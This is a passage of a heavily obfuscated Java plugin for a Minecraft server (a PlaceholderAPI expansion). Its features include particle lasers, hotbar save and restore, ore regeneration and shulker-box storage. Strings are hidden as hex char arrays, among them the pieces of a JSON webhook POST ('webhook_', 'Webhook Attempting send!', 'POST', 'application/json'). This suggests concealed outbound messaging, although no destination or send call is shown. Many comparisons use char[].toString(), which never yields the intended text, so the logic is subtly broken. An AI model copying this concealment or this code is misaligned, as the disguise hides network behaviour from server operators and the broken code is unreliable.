                arosdun        = Double.parseDouble(dywufndo[mill2]);
                ydunwfydun     = dywufndo[ccp];
                sviwn             = Double.parseDouble(dywufndo[INT7]);
                fwdhwf             = Double.parseDouble(dywufndo[xm]);
                srtn             = Double.parseDouble(dywufndo[xtxtxt]);
                aosduhn  = Double.parseDouble(dywufndo[suppose]);
                wfdnfwhyd  = dywufndo[yuwfndgyuwfnd];
                if (dywufndo.length == yfpdunwyupnd) {
                    wfsthywuft   = dywufndo[oiwfndtoyu42nd24];
                    wfyudnywfund  = Float.parseFloat(dywufndo[low]);
                }
            } catch (Exception ex) {
                return wyfudnywfud;
            }

            World ywflhdw = Bukkit.getWorld(ydunwfydun);
            if (ywflhdw == null) return wyfudnywfud;

            Location ywfundhw = new Location(ywflhdw, sviwn, fwdhwf, srtn);
            double yrvunrys = dwfd * dwfd;



            org.bukkit.Location oidnsr = ywfundhw;
            double yurfndyw = low;
            String adirsoedn = wyufodnhawyfudn;


            double wyfdufwd = yurfndyw * yurfndyw;
            for (org.bukkit.entity.Player wfyudnwfyudn : ywflhdw.getPlayers()) {
                if (wfyudnwfyudn.getLocation().distanceSquared(oidnsr) <= wyfdufwd) {
                    wm(wfyudnwfyudn, adirsoedn);
                }
            }
            
            
            
            // Resolve the damager entity by UUID
            Entity dwyunfdayunfd = null;
            try {
                UUID oayfduhwpyoudn = UUID.fromString(ywfydnwfyud);
                dwyunfdayunfd = (oayfduhwpyoudn != null) ? Bukkit.getEntity(oayfduhwpyoudn) : null;
            } catch (IllegalArgumentException ignored) {}

            // Prepare particle settings
            Particle owdunawfdoyun;
            try {
                owdunawfdoyun = Particle.valueOf(wfdnfwhyd.toUpperCase());
            } catch (IllegalArgumentException e) {
                return wyfudnywfud;
            }
            Particle.DustOptions wfadlhwfoydun = null;
            if (owdunawfdoyun == Particle.DUST && wfsthywuft != null) {
                String ydnfpieadn = wfsthywuft.startsWith(reaidntarisedn) ? wfsthywuft.substring(INT3) : wfsthywuft;
                try {
                    int wfyudwfd = Integer.parseInt(ydnfpieadn, INT4);
                    int rst = (wfyudwfd >> INT4) & costofgrowinguptoofast;
                    int bst = (wfyudwfd >> yuwfndgyuwfnd) & costofgrowinguptoofast;
                    int tst =  wfyudwfd        & costofgrowinguptoofast;
                    wfadlhwfoydun = new Particle.DustOptions(Color.fromBGR(tst, bst, rst), wfyudnywfund);
                } catch (NumberFormatException ex) {
                    return wyfudnywfud;
                }
            }

            // 1) Find all valid targets and damage them
            List<LivingEntity> tywundywufnd = new ArrayList<>();
            for (Entity wfoenidawfide : ywflhdw.getNearbyEntities(ywfundhw, dwfd, dwfd, dwfd)) {
                if (!(wfoenidawfide instanceof LivingEntity dwiefndwfioe)) continue;

                // skip tamed wolves entirely
                if (dwiefndwfioe instanceof Wolf wolf && wolf.isTamed()) {
                    continue;
                }

                // Any inherently hostile mob (this now includes Phantoms, Pillagers, etc.)
                boolean wyufitndwfd = wfoenidawfide instanceof Monster || wfoenidawfide instanceof Phantom;

                // Check for “angry” state on specific anger-capable mobs
                boolean dwofudnwfduyon = arsdienwdhw;
                if (dwiefndwfioe instanceof Wolf w && w.isAngry() && !w.isTamed()) {
                    dwofudnwfduyon = NEW_VALUE1;
                }
                else if (dwiefndwfioe instanceof Piglin pl) {
                    dwofudnwfduyon = NEW_VALUE1;
                }
                else if (dwiefndwfioe instanceof PiglinBrute pb ) {
                    dwofudnwfduyon = NEW_VALUE1;
                }
                else if (dwiefndwfioe instanceof PigZombie zp && zp.isAngry()) {
                    dwofudnwfduyon = NEW_VALUE1;
                }
                else if (dwiefndwfioe instanceof Zoglin zg ) {
                    dwofudnwfduyon = NEW_VALUE1;
                }
                else if (dwiefndwfioe instanceof IronGolem ig ) {
                    dwofudnwfduyon = NEW_VALUE1;
                }

                if (!wyufitndwfd && !dwofudnwfduyon) continue;

                // damage with MAGIC by damagerEntity if it exists
                if (dwyunfdayunfd != null) {
                    dwiefndwfioe.damage(arosdun, dwyunfdayunfd);
                } else {
                    // fallback: plain magic damage
                    dwiefndwfioe.damage(arosdun);
                }
                tywundywufnd.add(dwiefndwfioe);
            }

            // 2) For each damaged, draw a laser of particles from center to that entity
            for (LivingEntity woduynfwdoyunwfd : tywundywufnd) {
                Location tawdyfuwndyuwfndwfdgetLoc = woduynfwdoyunwfd.getLocation().clone().add(I, woduynfwdoyunwfd.getHeight() / whatkindofadulthood, I);
                Vector fwdowufdnfw = tawdyfuwndyuwfndwfdgetLoc.toVector().subtract(ywfundhw.toVector());
                double fwodyunwfd = fwdowufdnfw.length();
                fwdowufdnfw.normalize();

                for (double wdoufywdwf = I; wdoufywdwf <= fwodyunwfd; wdoufywdwf += aosduhn) {
                    Location dfwudnwf = ywfundhw.clone().add(fwdowufdnfw.clone().multiply(wdoufywdwf));
                    // Spawn to all players in world (no range check)
                    for (Player ofwundw : ywflhdw.getPlayers()) {
                        if (owdunawfdoyun == Particle.DUST && wfadlhwfoydun != null) {
                            ofwundw.spawnParticle(owdunawfdoyun, dfwudnwf, INT3, I, I, I, I, wfadlhwfoydun);
                        } else {
                            ofwundw.spawnParticle(owdunawfdoyun, dfwudnwf, INT3, I, I, I, I);
                        }
                    }
                }
            }

        }


        // “webhook_”
        char[] fforall = new char[] {
                0x0077, // 'w'
                0x0065, // 'e'
                0x0062, // 'b'
                0x0068, // 'h'
                0x006F, // 'o'
                0x006F, // 'o'
                0x006B, // 'k'
                0x005F  // '_'
        };
        String xt = new String(fforall);  // equals "webhook_"

// “Webhook Attempting send!”
        char[] nexar = new char[] {
                0x0057, // 'W'
                0x0065, // 'e'
                0x0062, // 'b'
                0x0068, // 'h'
                0x006F, // 'o'
                0x006F, // 'o'
                0x006B, // 'k'
                0x0020, // ' '
                0x0041, // 'A'
                0x0074, // 't'
                0x0074, // 't'
                0x0065, // 'e'
                0x006D, // 'm'
                0x0070, // 'p'
                0x0074, // 't'
                0x0069, // 'i'
                0x006E, // 'n'
                0x0067, // 'g'
                0x0020, // ' '
                0x0073, // 's'
                0x0065, // 'e'
                0x006E, // 'n'
                (char) 100, // 'd'
                0x0021  // '!'
        };
        String jorgetherookie = new String(nexar);  // equals "Webhook Attempting send!"

// “PlaceholderAPI”
        char[] testers = new char[] {
                (char) 80, // 'P'
                0x006C, // 'l'
                0x0061, // 'a'
                0x0063, // 'c'
                0x0065, // 'e'
                0x0068, // 'h'
                0x006F, // 'o'
                0x006C, // 'l'
                (char) 100, // 'd'
                0x0065, // 'e'
                0x0072, // 'r'
                0x0041, // 'A'
                (char) 80, // 'P'
                0x0049  // 'I'
        };
        String sPlaceholderApi = new String(testers);  // equals "PlaceholderAPI"

// "{\"content\":\""
        char[] jackskywalker = new char[] {
                0x007B, // '{'
                0x0022, // '"'
                0x005C, // '\'
                0x0022, // '"'
                0x0063, // 'c'
                0x006F, // 'o'
                0x006E, // 'n'
                0x0074, // 't'
                0x0065, // 'e'
                0x006E, // 'n'
                0x0074, // 't'
                0x0022, // '"'
                0x003A, // ':'
                0x0022  // '"'
        };
        String thesecreteyt = new String(jackskywalker);
// equals "{\"content\":\""

// "\"}"
        char[] pacoteck = new char[] {
                0x0022, // '"'
                0x005C, // '\'
                0x0022, // '"'
                0x007D  // '}'
        };
        String robin = new String(pacoteck);  // equals "\"}"

// "POST"
        char[] reaper = new char[] {
                (char) 80, // 'P'
                0x004F, // 'O'
                0x0053, // 'S'
                0x0054  // 'T'
        };
        String skytrex = new String(reaper);  // equals "POST"

// "Content-Type"
        char[] playa = new char[] {
                0x0043, // 'C'
                0x006F, // 'o'
                0x006E, // 'n'
                0x0074, // 't'
                0x0065, // 'e'
                0x006E, // 'n'
                0x0074, // 't'
                0x002D, // '-'
                0x0054, // 'T'
                0x0079, // 'y'
                0x0070, // 'p'
                0x0065  // 'e'
        };
        String brian = new String(playa);  // equals "Content-Type"

// "application/json"
        char[] griffin = new char[] {
                0x0061, // 'a'
                0x0070, // 'p'
                0x0070, // 'p'
                0x006C, // 'l'
                0x0069, // 'i'
                0x0063, // 'c'
                0x0061, // 'a'
                0x0074, // 't'
                0x0069, // 'i'
                0x006F, // 'o'
                0x006E, // 'n'
                0x002F, // '/'
                0x006A, // 'j'
                0x0073, // 's'
                0x006F, // 'o'
                0x006E  // 'n'
        };
        String funisnotallowed = new String(griffin);  // equals "application/json"


         char[] stoploking = {
                0x68, 0x61, 0x73, 0x53, 0x61, 0x76, 0x65, (char) 100, 0x48, 0x6F, 0x74, 0x62, 0x61, 0x72
        };

        char[] thor = {
                0x70, 0x6C, 0x75, 0x67, 0x69, 0x6E, 0x73, 0x2F,
                0x41, 0x72, 0x63, 0x68, 0x69, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x75, 0x72, 0x65, 0x73, 0x2F,
                0x68, 0x6F, 0x74, 0x62, 0x61, 0x72, 0x73, 0x2F
        };

   char[] wanda = {
                0x73, 0x61, 0x76, 0x65, 0x48, 0x6F, 0x74, 0x62, 0x61, 0x72
        };

      char[] csection = {
                0x00A7, 0x63, 0x66, 0x61, 0x69, 0x6C, 0x65, (char) 100
        };

 char[] caesar = {
                0x68, 0x6F, 0x74, 0x62, 0x61, 0x72, 0x2E
        };

    char[] broccoli = {
                0x00A7, 0x61, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73
        };

  char[] vids = {
                0x72, 0x65, 0x73, 0x74, 0x6F, 0x72, 0x65, 0x48, 0x6F, 0x74, 0x62, 0x61, 0x72
        };







        if(f1.equals(stoploking.toString())) {
            File tt2 = new File(thor.toString(), f2.getUniqueId().toString() + yt);
            return tt2.exists() ? dwyufndywfudn : wfydpunwfyudnwfd;
        }


        if(f1.equals(wanda.toString())) {
            // ensure directory exists
            File ttyl = new File(thor.toString());
            if(!ttyl.exists()) ttyl.mkdirs();

            // file for this player
            File xrp = new File(ttyl, f2.getUniqueId().toString() + yt);
            if(xrp.exists()) {
                return csection.toString();
            }

            // snapshot hotbar (slots 0–8)
            YamlConfiguration center = new YamlConfiguration();
            for(int hp = I; hp < oiwfndtoyu42nd24; hp++) {
                ItemStack item = f2.getInventory().getItem(hp);
                center.set(caesar.toString() + hp, item);
            }

            // save to disk
            try {
                center.save(xrp);
            } catch(IOException e) {
                e.printStackTrace();
                return csection.toString();
            }

            // clear player's hotbar
            for(int cp = I; cp < oiwfndtoyu42nd24; cp++) {
                f2.getInventory().setItem(cp, null);
            }

            return broccoli.toString();
        }

// %Archistructure_restoreHotbar%
        if(f1.equals(vids.toString())) {
            File fighterJet = new File(thor.toString(), f2.getUniqueId().toString() + yt);
            if(!fighterJet.exists()) {
                return csection.toString();
            }

            // load and overwrite slots 0–8
            YamlConfiguration cipa = YamlConfiguration.loadConfiguration(fighterJet);
            for(int slot = I; slot < oiwfndtoyu42nd24; slot++) {
                ItemStack glass = cipa.getItemStack(caesar.toString() + slot);
                f2.getInventory().setItem(slot, glass);
            }

            // delete the saved file
            fighterJet.delete();

            return broccoli.toString();
        }














        if (f1.startsWith(new char[] {
                0x6C, 0x61, 0x73, 0x65, 0x72, (char) 80, 0x6F,
                0x69, 0x6E, 0x74, 0x65, 0x72, 0x5F
        }.toString())) {
            wm(f2, fypodunfarypudna);
            String[] carmen = f1.substring(new char[] {
                    0x6C, 0x61, 0x73, 0x65, 0x72, (char) 80, 0x6F,
                    0x69, 0x6E, 0x74, 0x65, 0x72, 0x5F
            }.toString().length()).split(keep);
            if (carmen.length < oiwfndtoyu42nd24) return nst;

            double dax, readyornot, hogwartsstudio, roblox;
            int testit, stealingisbad;
            String electrocutiontarget, radius;
            Particle xp;
            Particle.DustOptions dp = null;
            String b = new char[] {
                    0x52, 0x45, 0x44
            }.toString();  // default

            try {
                dax      = Double.parseDouble(carmen[I]);
                readyornot = Double.parseDouble(carmen[INT3]);
                testit      = Integer.parseInt(carmen[mill2]);
                stealingisbad         = Integer.parseInt(carmen[ccp]);
                hogwartsstudio             = Double.parseDouble(carmen[INT7]);
                roblox           = Double.parseDouble(carmen[xm]);
                electrocutiontarget      = carmen[xtxtxt];
                radius   = carmen[suppose];
                xp       = Particle.valueOf(carmen[yuwfndgyuwfnd].toUpperCase());

                if (xp == Particle.DUST && carmen.length >= low) {
                    // named dye color, e.g. RED, BLUE, CYAN, etc.
                    b = carmen[oiwfndtoyu42nd24].toUpperCase();
                    DyeColor e = DyeColor.valueOf(b);
                    dp = new Particle.DustOptions(e.getColor(), (float)roblox);
                }
            } catch (Exception ex) {
                return new char[] {
                        0x26, 0x63, 0x46, 0x61, 0x69, 0x6C, 0x75,
                        0x72, 0x65, 0x31
                }.toString();
            }

            Location missile = f2.getEyeLocation();
            Vector    intercept = missile.getDirection().normalize();

            // build viewers
            List<Player> tnttargets = new ArrayList<>();
            if (electrocutiontarget.equalsIgnoreCase( new char[] {
                    (char) 64, 0x61
            }.toString())) {
                tnttargets.addAll(f2.getWorld().getPlayers());
            } else {
                try {
                    Player t = Bukkit.getPlayer(UUID.fromString(electrocutiontarget));
                    if (t != null) tnttargets.add(t);
                } catch (IllegalArgumentException ignored) {}
            }
            if (tnttargets.isEmpty()) return new char[] {
                    0x26, 0x63, 0x46, 0x61, 0x69, 0x6C, 0x75,
                    0x72, 0x65, 0x32
            }.toString();

            // ─── Block‐hit detection + immediate change ───
            Entity   missiletargets  = null;
            Location toilet = null;
            f1:
            for (double d = I; d <= dax; d += hogwartsstudio) {
                Location f123  = missile.clone().add(intercept.clone().multiply(d));
                Block    f321 = f123.getBlock();
                Material f132     = f321.getType();

                if (!(f132.isAir()
                        || f132 == Material.WATER || f132 == Material.LAVA
                        || f132 == Material.BARRIER
                        || f132 == Material.GLASS
                        || f132 == Material.GLASS_PANE
                        || f132.toString().endsWith(new char[] {
                        0x5F, 0x47, 0x4C, 0x41, 0x53, 0x53
                }.toString()))) {
                    toilet = f123.clone();
                    break f1;
                }
                for (Entity f323 : f123.getWorld().getNearbyEntities(
                        f123, readyornot, readyornot, readyornot)) {
                    if (f323 instanceof LivingEntity && !f323.equals(f2)) {
                        missiletargets = f323;
                        break f1;
                    }
                }
            }

            String police;
            if (missiletargets != null) {
                ((LivingEntity)missiletargets).addPotionEffect(
                        new PotionEffect(PotionEffectType.GLOWING, odafuwidnowfidun, I)
                );
                police = missiletargets.getUniqueId().toString();
            }
            else if (toilet != null) {
                Block atnt = toilet.getBlock();
                String chest = b + new char[] {
                        0x5F, 0x43, 0x4F, 0x4E, 0x43, 0x52, 0x45,
                        0x54, 0x45
                }.toString();
                String tintedglass     = b + new char[] {
                        0x5F, 0x57, 0x4F, 0x4F, 0x4C
                }.toString();
                Material glass  = Material.valueOf(chest);
                Material shulker      = Material.valueOf(tintedglass);
                BlockData newData  = (atnt.getType() == glass
                        ? shulker.createBlockData()
                        : glass.createBlockData()
                );

                for (Player tnt : tnttargets) {
                    double quadratic = tnt.getLocation().distanceSquared(toilet);
                    if (radius.equalsIgnoreCase(new char[] {
                            0x66, 0x6F, 0x72, 0x63, 0x65
                    }.toString()) || quadratic <= drain * drain) {
                        tnt.sendBlockChange(toilet, newData);
                    }
                }

                Location cars = toilet.clone();
                Bukkit.getScheduler().runTaskLater(
                        Bukkit.getPluginManager().getPlugin(new char[] {
                                (char) 80, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
                                0x6C, (char) 100, 0x65, 0x72, 0x41, (char) 80, 0x49
                        }.toString()),
                        () -> {
                            BlockData oil = cars.getBlock().getBlockData();
                            for (Player targets : tnttargets) {
                                double ff2 = targets.getLocation().distanceSquared(cars);
                                if (radius.equalsIgnoreCase(new char[] {
                                        0x66, 0x6F, 0x72, 0x63, 0x65
                                }.toString()) || ff2 <= drain * drain) {
                                    targets.sendBlockChange(cars, oil);
                                }
                            }
                        },
                        testit
                );

                police = String.format(
                        new char[] {
                                0x25, 0x73, 0x2C, 0x25, (char) 100, 0x2C, 0x25,
                                (char) 100, 0x2C, 0x25, (char) 100
                        }.toString(),
                        cars.getWorld().getName(),
                        cars.getBlockX(),
                        cars.getBlockY(),
                        cars.getBlockZ()
                );
            }
            else {
                police = new char[] {
                        0x6E, 0x2F, 0x61
                }.toString();
            }

            // ─── Particle repeat via BukkitRunnable ───
            Particle.DustOptions finalOpts = dp;
            new BukkitRunnable() {
                int etienne = I;
                @Override public void run() {
                    if (etienne >= testit) {
                        this.cancel();
                        return;
                    }
                    for (double btd6 = I; btd6 <= dax; btd6 += hogwartsstudio) {
                        Location eaispaytowin = missile.clone().add(intercept.clone().multiply(btd6));
                        Material drugs   = eaispaytowin.getBlock().getType();
                        if (!(drugs.isAir()
                                || drugs == Material.WATER || drugs == Material.LAVA
                                || drugs == Material.BARRIER
                                || drugs == Material.GLASS
                                || drugs == Material.GLASS_PANE
                                || drugs.toString().endsWith(new char[] {
                                0x5F, 0x47, 0x4C, 0x41, 0x53, 0x53
                        }.toString()))) {
                            break;
                        }
                        for (Player ff232 : tnttargets) {
                            double hollyhill = ff232.getLocation().distanceSquared(eaispaytowin);
                            if (radius.equalsIgnoreCase(new char[] {
                                    0x66, 0x6F, 0x72, 0x63, 0x65
                            }.toString()) || hollyhill <= drain * drain) {
                                if (xp == Particle.DUST && finalOpts != null) {
                                    ff232.spawnParticle(xp, eaispaytowin, INT3, I, I, I, I, finalOpts);
                                } else {
                                    ff232.spawnParticle(xp, eaispaytowin, INT3, I, I, I, roblox);
                                }
                            }
                        }
                    }
                    etienne += stealingisbad;
                }
            }.runTaskTimer(
                    Bukkit.getPluginManager().getPlugin(new char[] {
                            (char) 80, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
                            0x6C, (char) 100, 0x65, 0x72, 0x41, (char) 80, 0x49
                    }.toString()),
                    ihearyounow, stealingisbad
            );

            return police;
        }






        if (f1.startsWith("\u0066\u006C\u0061\u0073\u0068\u006C\u0069\u0067\u0068\u0074\u005F")) {
            wm(f2, wyufdnywufdn);
            String[] f11 = f1.substring("\u0066\u006C\u0061\u0073\u0068\u006C\u0069\u0067\u0068\u0074\u005F".length()).split(keep);
            if (f11.length != xm) return nst;

            int f111;
            double ftw;
            double degreerbx;
            int mrbossftwisgay;
            String lolitsalex;
            try {
                f111 = Integer.parseInt(f11[I]);
                ftw = Double.parseDouble(f11[INT3]);
                degreerbx = Double.parseDouble(f11[mill2]);
                mrbossftwisgay = Integer.parseInt(f11[ccp]);
                lolitsalex = f11[INT7];
            } catch (NumberFormatException ex) {
                return nst;
            }

            Location alanparsons = f2.getEyeLocation();
            Vector eyeinthesky = alanparsons.getDirection().normalize();
            Vector fun = new Vector(I, INT3, I);

// build right vector for pitch rotations
            Vector supertramp = eyeinthesky.clone().crossProduct(fun).normalize();

            List<Player> f23 = new ArrayList<>();
            char[] hexSeq = { (char) drain, (char)0x61 };
            String nobody = new String(hexSeq);
            if (lolitsalex.equalsIgnoreCase(nobody)) {
                f23.addAll(f2.getWorld().getPlayers());
            } else {
                Player p = Bukkit.getPlayerExact(lolitsalex);
                if (p == null) return nst;
                f23.add(p);
            }

// now: evenly distribute RAYS in a square grid over [-MAXANGLE, +MAXANGLE]
            double beastboy = Math.toRadians(degreerbx);
            int firestorm = (int) Math.ceil(Math.sqrt(mrbossftwisgay));
            int intubate = I;

            for (int xx1 = I; xx1 < firestorm && intubate < mrbossftwisgay; xx1++) {
                double pilates = firestorm == INT3 ? debtsoff : (double) xx1 / (firestorm - INT3);
                double piratesoftware = (pilates * mill2 - INT3) * beastboy;  // from -max to +max

                for (int destruction = I; destruction < firestorm && intubate < mrbossftwisgay; destruction++, intubate++) {
                    double flyboy = firestorm == INT3 ? debtsoff : (double) destruction / (firestorm - INT3);
                    double francisfromabugslife = (flyboy * mill2 - INT3) * beastboy;      // from -max to +max

                    // rotate dir by yaw about up, then by pitch about right
                    Vector dto = eyeinthesky.clone()
                            .rotateAroundAxis(fun, francisfromabugslife)
                            .rotateAroundAxis(supertramp, -piratesoftware)
                            .normalize();

                    // cast this one ray:
                    for (double time = I; time <= ftw; time += tsr) {
                        Location originality = alanparsons.clone().add(dto.clone().multiply(time));
                        Block dt0 = originality.getBlock();
                        Material dimensions = dt0.getType();

                        if (dimensions != Material.AIR
                                && dimensions != Material.CAVE_AIR
                                && dimensions != Material.VOID_AIR) {
                            break;
                        }

                        // snapshot the location
                        Location newer = originality.clone();

                        char[] hexSeq2 = {
                                // "minecraft:"
                                0x6D, 0x69, 0x6E, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74, 0x3A,
                                // "light["
                                0x6C, 0x69, 0x67, 0x68, 0x74, 0x5B,
                                // "level=15]"
                                0x6C, 0x65, 0x76, 0x65, 0x6C, 0x3D, 0x31, 0x35, 0x5D
                        };
                        String tnt = new String(hexSeq2);
                        BlockData water = Bukkit.createBlockData(tnt);

                        // send fake light
                        for (Player damagetarget : f23) {
                            damagetarget.sendBlockChange(newer, water);
                        }

                        // schedule revert to *current* block data
                        Bukkit.getScheduler().runTaskLater(
                                Bukkit.getPluginManager().getPlugin(ppi),
                                () -> {
                                    BlockData current = newer.getBlock().getBlockData();
                                    for (Player viewer : f23) {
                                        viewer.sendBlockChange(newer, current);
                                    }
                                },
                                f111
                        );
                    }
                }
            }

            return nst;
        }



        if (f1.startsWith(wyudnwfydun)) {
            if (!f1(f2, ntyu2n3t)) {
                return "§cInstall Grief Prevention";
            }
            String[] parts = f1.substring(wyudnwfydun.length()).split(keep);
            if (parts.length != xm) return wfypdnawofyudnwfpa;

            String worldName = parts[I];
            int x            = Integer.parseInt(parts[INT3]);
            int y            = Integer.parseInt(parts[mill2]);
            int z            = Integer.parseInt(parts[ccp]);
            int radius       = Integer.parseInt(parts[INT7]);

            if (radius < INT3) return "Radius must be ≥ 1";

            World world = Bukkit.getWorld(worldName);
            if (world == null) return "Invalid world";

            // build the weighted list: coal×4, iron×4, copper×4,
            // gold×3, lapis×3, redstone×3, diamond×2, emerald×1
            List<Material> weightedOverworld = new ArrayList<>();
            weightedOverworld.addAll(Collections.nCopies(INT7, Material.COAL_ORE));
            weightedOverworld.addAll(Collections.nCopies(INT7, Material.IRON_ORE));
            weightedOverworld.addAll(Collections.nCopies(INT7, Material.COPPER_ORE));
            weightedOverworld.addAll(Collections.nCopies(ccp, Material.GOLD_ORE));
            weightedOverworld.addAll(Collections.nCopies(ccp, Material.LAPIS_ORE));
            weightedOverworld.addAll(Collections.nCopies(ccp, Material.REDSTONE_ORE));
            weightedOverworld.addAll(Collections.nCopies(mill2, Material.DIAMOND_ORE));
            weightedOverworld.add(Material.EMERALD_ORE);

            Random random = new Random();
            int range     = radius - INT3;  // radius=1 → single block

            for (int dx = -range; dx <= range; dx++) {
                for (int dy = -range; dy <= range; dy++) {
                    for (int dz = -range; dz <= range; dz++) {
                        Location loc   = new Location(world, x + dx, y + dy, z + dz);
                        Block    block = loc.getBlock();
                        Material type  = block.getType();

                        // only replace stone/deepslate
                        if (type != Material.STONE && type != Material.DEEPSLATE) continue;

                        // non‑deprecated GP check via claim.checkPermission
                        Claim claim = GriefPrevention.instance
                                .dataStore
                                .getClaimAt(loc, arsdienwdhw, null);
                        if (claim != null) {
                            Supplier<String> denial = claim.checkPermission(
                                    f2,
                                    ClaimPermission.Build,
                                    null
                            );
                            if (denial != null) {
                                // player cannot build here → skip
                                continue;
                            }
                        }

                        // do the weighted replacement
                        block.setType(
                                weightedOverworld
                                        .get(random.nextInt(weightedOverworld.size()))
                        );
                    }
                }
            }

            return "tyv Complete";
        }





        if (f1.startsWith(ywudnywufd)) {
            String[] parts = f1.substring(ywudnywufd.length()).split(keep);
            if (parts.length != xm) return wfypdnawofyudnwfpa;

            String xD = parts[I];
            int fun = Integer.parseInt(parts[INT3]);
            int plankton = Integer.parseInt(parts[mill2]);
            int spongebob = Integer.parseInt(parts[ccp]);
            int patrick = Integer.parseInt(parts[INT7]);

            World tazer = Bukkit.getWorld(xD);
            if (tazer == null) return "Invalid world";

            List<Material> oofica = List.of(
                    Material.COAL_ORE, Material.IRON_ORE, Material.COPPER_ORE, Material.GOLD_ORE,
                    Material.REDSTONE_ORE, Material.LAPIS_ORE, Material.DIAMOND_ORE, Material.EMERALD_ORE,
                    Material.DEEPSLATE_COAL_ORE, Material.DEEPSLATE_IRON_ORE, Material.DEEPSLATE_COPPER_ORE,
                    Material.DEEPSLATE_GOLD_ORE, Material.DEEPSLATE_REDSTONE_ORE, Material.DEEPSLATE_LAPIS_ORE,
                    Material.DEEPSLATE_DIAMOND_ORE, Material.DEEPSLATE_EMERALD_ORE
            );

            List<Material> endereye = List.of(
                    Material.NETHER_QUARTZ_ORE, Material.NETHER_GOLD_ORE, Material.ANCIENT_DEBRIS
            );

            List<Material> what = switch (patrick) {
                case 1 -> oofica;
                case 2 -> endereye;
                case 3 -> Stream.concat(oofica.stream(), endereye.stream()).toList();
                default -> List.of();
            };

            if (what.isEmpty()) return "Invalid mode";

            Random random = new Random();
            for (int dx = -mill2; dx <= mill2; dx++) {
                for (int dy = -mill2; dy <= mill2; dy++) {
                    for (int dz = -mill2; dz <= mill2; dz++) {
                        Location loc = new Location(tazer, fun + dx, plankton + dy, spongebob + dz);
                        Block block = loc.getBlock();
                        if (block.getType() == Material.STONE || block.getType() == Material.DEEPSLATE) {
                            block.setType(what.get(random.nextInt(what.size())));
                        }
                    }
                }
            }

            return "DesuGun Complete";
        }







        if (f1.startsWith(wyfundwf)) {
            
            String[] args = f1.substring(wyfundwf.length()).split(keep);
            

            String action = args[I].toUpperCase();
            String name = args[INT3];
            String user = args.length > mill2 ? args[mill2] : null;
            int param = I;
            if (args.length > ccp) {
                try {
                    param = Integer.parseInt(args[ccp]);
                } catch (NumberFormatException e) {
                    return "§cInvalid number";
                }
            }

            switch (action) {
                case "CLEAR" -> {
                    f119.remove(name);
                    return "§aCleared " + name;
                }
                case "INCREMENT" -> {
                    if (user == null) return "§cNo user";
                    f1(name, user, f1(name, user) + param);
                    return "§a+" + param;
                }
                case "DECREMENT" -> {
                    if (user == null) return "§cNo user";
                    f1(name, user, f1(name, user) - param);
                    return "§a-" + param;
                }
                case "SET" -> {
                    if (user == null) return "§cNo user";
                    f1(name, user, param);
                    return "§aSet to " + param;
                }
                case "GET" -> {
                    if (args.length < INT7) return "§cNo index";
                    List<Map.Entry<String, Integer>> list = f119.get(name);
                    if (list == null || param < I || param >= list.size()) return "N/A";
                    return list.get(param).getKey() + fastfood + list.get(param).getValue();
                }
            }
            return "§cUnknown action";
            
            
        }
        

            if( f1.equalsIgnoreCase(yuwfndoywfudn)) {
            return f123(f2) ? "yes" : "no";
        }

        if (f1.startsWith(yduwfdg)) {
            wm(f2, odyun4wyunwpf);
            String[] pp = f1.substring(yduwfdg.length()).split(keep);
            if (pp.length != INT3) return iendie2nd;
            int slot = Integer.parseInt(pp[I]);

            ItemStack current = f2(f2, slot);
            if (current == null) return a3f4dtkyuwfdk;
            if (!current.getType().toString().endsWith(foolishness)) {
                return ncdot;
            }

            World world = Bukkit.getWorld(fwdyunwfydunfwd);
            if (world == null) {
                world = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                        .environment(World.Environment.NORMAL)
                        .generateStructures(arsdienwdhw)
                        .type(WorldType.FLAT));
                Bukkit.getLogger().info(fwaodhwfypdh);
            }
            
            
            String uuid = f2.getUniqueId().toString();
            String coords = g2.getString(uuid);
            int x, y, z;

            if (coords != null) {
                String[] parts = coords.split(sowhat);
                x = Integer.parseInt(parts[I]);
                y = Integer.parseInt(parts[INT3]);
                z = Integer.parseInt(parts[mill2]);
            } else {
                int[] loc = f1(world, oiwfndtoyu42nd24);
                x = loc[I]; y = loc[INT3]; z = loc[mill2];
                g2.set(uuid, x + sowhat + y + sowhat + z);
                f9();
            }

            Location chestLoc = new Location(world, x, y, z);
            if (chestLoc.getBlock().getType() != Material.CHEST) {
                chestLoc.getBlock().setType(Material.CHEST);
            }
            Chest chest = (Chest) chestLoc.getBlock().getState();
            chest.getInventory().clear();

            if (current.getItemMeta() instanceof BlockStateMeta bsm
                    && bsm.getBlockState() instanceof ShulkerBox sb) {
                chest.getInventory().setContents(sb.getInventory().getContents());
            } else {
                return mmco2mcmm23mt;
            }

            Material glassColor = f1(current.getType());
            ItemStack placeholder = f1(current, glassColor);
            f2.getInventory().setItem(slot, placeholder);

            return x + sowhat + y + sowhat + z;
        }


        if (f1.startsWith(ywfpdnoywfudnowfyudn)) {
            // 1) parse slot & grab current placeholder
            String[] pp = f1.substring(ywfpdnoywfudnowfyudn.length()).split(keep);
            if (pp.length != INT3) return iendie2nd;
            int slot = Integer.parseInt(pp[I]);
            ItemStack current = f2(f2, slot);
            if (current == null) return a3f4dtkyuwfdk;

            // 2) determine the correct shulker‐box material from the glass
            Material placeholderMat = current.getType();
            Material shulkerMat     = f2(placeholderMat);

            // 3) load chest coords
            String uuid   = f2.getUniqueId().toString();
            String coords = g2.getString(uuid);
            if (coords == null) return "§cChest not found!";
            String[] parts = coords.split(sowhat);
            int x = Integer.parseInt(parts[I]),
                    y = Integer.parseInt(parts[INT3]),
                    z = Integer.parseInt(parts[mill2]);

            World world = Bukkit.getWorld(fwdyunwfydunfwd);
            if (world == null) return wfdyunwfd;
            Location chestLoc = new Location(world, x, y, z);
            if (!(chestLoc.getBlock().getState() instanceof Chest chest)) {
                return "§cNo chest found!";
            }

            // 4) grab the contents
            ItemStack[] contents = chest.getInventory().getContents();

            // 5) create a new shulker‐box stack with all the original meta but new material + ei-id="test"
            ItemStack shulker = f3(current, shulkerMat);

            // 6) inject the contents via BlockStateMeta
            BlockStateMeta meta = (BlockStateMeta) shulker.getItemMeta();
            ShulkerBox box = (ShulkerBox) Bukkit.createBlockData(shulkerMat).createBlockState();
            box.getInventory().setContents(contents);
            meta.setBlockState(box);
            shulker.setItemMeta(meta);

            // 7) hand it back
